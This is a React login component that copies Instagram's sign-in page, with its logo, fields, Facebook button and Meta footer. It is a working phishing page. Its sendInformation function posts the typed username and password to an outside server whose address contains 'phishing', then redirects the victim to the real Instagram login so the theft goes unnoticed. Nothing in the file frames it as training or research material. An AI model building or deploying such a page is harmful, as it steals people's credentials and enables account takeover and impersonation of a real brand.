import React, { useState } from "react";
import axios from "axios"

export default function Login() {
  
    const BASE_URL = "https://phishing-oqnc.onrender.com";

    const [passwordVisible, setPasswordVisible] = useState(false);
    
    const [ username , setUsername ] = useState("");
    const [ password , setPassword ] = useState("");

    async function sendInformation(e) {
        
        let response = await axios.post(`${BASE_URL}/api/sendInformation` , 
            {
                username: username,
                password: password
            }
        )

        let Message = response.data.Message;

        if( Message === "ok" ){
            console.log("Message: " , Message);
            window.location.assign("https://instagram.com/accounts/login");
            console.log("user has bin redirected");
        }else{
            console.log("error: " , Message);
        }

    }



  return (
    <div className="ig-page">
      <div className="ig-main">
        <div className="ig-login-container">

          {/* Login card */}
          <div className="ig-login-card">

            <div className="ig-logo">Instagram</div>

              <div className="ig-input-wrapper">
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  autoComplete="username"
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>

              <div className="ig-input-wrapper password-wrapper">
                <input
                  type={passwordVisible ? "text" : "password"}
                  placeholder="Password"
                  autoComplete="current-password"
                  onChange={(e) => setPassword(e.target.value)}
                />

                <button
                  type="button"
                  className="show-password"
                  onClick={() => setPasswordVisible(!passwordVisible)}
                >
                  {passwordVisible ? "Hide" : "Show"}
                </button>
              </div>

              <button className="ig-login-button" onClick={sendInformation}>
                Log in
              </button>

            <div className="ig-or">
              <div />
              <span>OR</span>
              <div />
            </div>

            <button className="facebook-login" type="button">
              <span className="facebook-icon">f</span>
              Log in with Facebook
            </button>

            <a href="#" className="forgot-link">
              Forgot password?
            </a>
          </div>

          {/* Sign up */}
          <div className="ig-signup-card">
            <span>Don't have an account?</span>
            <a href="#">Sign up</a>
          </div>

          {/* App */}
          <div className="ig-app">
            <p>Get the app.</p>

            <div className="app-buttons">
              <a href="#" className="app-button">
                <span className="apple">●</span>

                <span className="app-text">
                  <small>Download on the</small>
                  App Store
                </span>
              </a>

              <a href="#" className="app-button">
                <span className="google-play">▶</span>

                <span className="app-text">
                  <small>GET IT ON</small>
                  Google Play
                </span>
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="ig-footer">
        <div className="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>

        <div className="footer-bottom">
          <select defaultValue="English">
            <option>English</option>
            <option>Deutsch</option>
            <option>Español</option>
            <option>Français</option>
          </select>

          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
